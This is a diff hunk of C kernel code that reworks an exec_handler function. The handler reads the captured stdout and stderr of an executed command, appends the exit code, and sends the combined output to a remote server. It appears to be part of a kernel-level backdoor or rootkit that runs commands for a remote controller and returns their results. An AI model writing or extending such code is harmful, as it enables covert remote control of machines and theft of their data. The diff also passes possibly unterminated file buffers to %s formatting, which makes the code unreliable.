@@ -214,10 +214,41 @@ static int exec_handler(char *args) {
     }
 
     if (catch_stds) {
-        send_to_server("stdout:");
-        send_file_to_server(STDOUT_FILE);
-        send_to_server("stderr:");
-        send_file_to_server(STDERR_FILE);
+        char stdout_msg[] = "stdout:\n";
+        int stdout_buff_size = 0;
+        char *stdout_buff = read_file(STDOUT_FILE, &stdout_buff_size);
+
+        char stderr_msg[] = "stderr:\n";
+        int stderr_buff_size = 0;
+        char *stderr_buff = read_file(STDERR_FILE, &stderr_buff_size);
+
+        if (stdout_buff_size < 0 || stderr_buff_size < 0) {
+            ERR_MSG("exec_handler: failed to read stdout or stderr files\n");
+            send_to_server("Failed to read stdout or stderr files\n");
+            if (stdout_buff)
+                kfree(stdout_buff);
+            if (stderr_buff)
+                kfree(stderr_buff);
+            return -EIO;
+        }
+
+        char code_msg[32] = {0};
+        snprintf(code_msg, sizeof(code_msg), "Terminated with code: %d\n", ret_code);
+
+        char *output_msg = kmalloc(stdout_buff_size + stderr_buff_size + sizeof(stdout_msg) + sizeof(stderr_msg) + sizeof(code_msg), GFP_KERNEL);
+        if (!output_msg) {
+            ERR_MSG("exec_handler: failed to allocate memory for output message\n");
+            kfree(stdout_buff);
+            kfree(stderr_buff);
+            return -ENOMEM;
+        }
+        snprintf(output_msg, stdout_buff_size + stderr_buff_size + sizeof(stdout_msg) + sizeof(stderr_msg) + sizeof(code_msg),
+                 "%s%s%s%s%s", stdout_msg, stdout_buff, stderr_msg, stderr_buff, code_msg);
+                 
+        send_to_server(output_msg);
+        kfree(output_msg);
+        kfree(stdout_buff);
+        kfree(stderr_buff);
     }
 
     return ret_code;
